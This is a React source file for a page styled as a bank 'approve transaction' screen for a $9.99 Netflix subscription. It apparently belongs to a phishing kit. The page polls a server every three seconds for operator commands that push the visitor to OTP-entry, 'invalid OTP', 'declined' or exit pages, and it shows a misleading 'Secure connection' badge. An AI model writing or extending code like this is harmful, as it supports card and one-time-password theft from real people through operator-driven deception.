import { useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/contexts/SessionContext";
import { Loader2, CreditCard, Wifi, Shield } from "lucide-react";

export default function BankAppPage() {
  const [, navigate] = useLocation();
  const { sessionId, t } = useSession();

  const clearCommand = trpc.session.clearCommand.useMutation();
  const pollQuery = trpc.session.poll.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId, refetchInterval: 3000 }
  );

  useEffect(() => {
    if (!pollQuery.data) return;
    const { command } = pollQuery.data;
    if (command === "none") return;

    clearCommand.mutate({ sessionId: sessionId! });

    if (command === "otp_page") navigate("/otp");
    else if (command === "invalid_otp") navigate("/invalid-otp");
    else if (command === "declined") navigate("/declined");
    else if (command === "normal") navigate("/payment");
    else if (command === "block") navigate("/");
  }, [pollQuery.data?.command]);

  return (
    <div style={{ backgroundColor: "#f0f2f5", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "16px" }}>
      <div style={{ backgroundColor: "white", borderRadius: "16px", padding: "clamp(24px, 6vw, 40px) clamp(20px, 6vw, 32px)", maxWidth: "400px", width: "100%", boxShadow: "0 4px 24px rgba(0,0,0,0.10)", textAlign: "center", boxSizing: "border-box" }}>

        {/* Bank icon */}
        <div style={{ width: "clamp(60px, 15vw, 80px)", height: "clamp(60px, 15vw, 80px)", borderRadius: "50%", background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px", boxShadow: "0 4px 16px rgba(0,0,0,0.2)" }}>
          <CreditCard size={32} color="white" />
        </div>

        <h1 style={{ fontSize: "clamp(18px, 5vw, 22px)", fontWeight: 800, color: "#1a1a1a", marginBottom: "8px" }}>{t("approveTransaction")}</h1>
        <p style={{ color: "#666", fontSize: "clamp(13px, 3.5vw, 14px)", marginBottom: "clamp(20px, 5vw, 32px)", lineHeight: "1.5" }}>{t("waitingApproval")}</p>

        {/* Transaction card */}
        <div style={{ backgroundColor: "#f8f9fa", borderRadius: "12px", padding: "clamp(14px, 4vw, 20px)", marginBottom: "clamp(20px, 5vw, 28px)", border: "1px solid #e9ecef" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
          <CreditCard size={18} color="#E50914" />
          <span style={{ fontSize: "clamp(13px, 3.5vw, 14px)", color: "#333", fontWeight: 600 }}>Netflix Subscription</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", borderTop: "1px solid #e9ecef", paddingTop: "12px" }}>
            <span style={{ color: "#666", fontSize: "clamp(12px, 3vw, 13px)" }}>Amount</span>
            <span style={{ color: "#1a1a1a", fontSize: "clamp(16px, 4vw, 18px)", fontWeight: 800 }}>$9.99</span>
          </div>
        </div>

        {/* Loading spinner */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", color: "#666", fontSize: "clamp(13px, 3.5vw, 14px)", marginBottom: "16px" }}>
          <Loader2 size={20} style={{ animation: "spin 1s linear infinite", color: "#E50914", flexShrink: 0 }} />
          <span>{t("waitingApproval")}</span>
        </div>

        {/* Secure badge */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "6px", color: "#999", fontSize: "clamp(11px, 2.5vw, 12px)" }}>
          <Shield size={12} color="#4ade80" />
          <Wifi size={12} />
          <span>Secure connection</span>
        </div>
      </div>
    </div>
  );
}
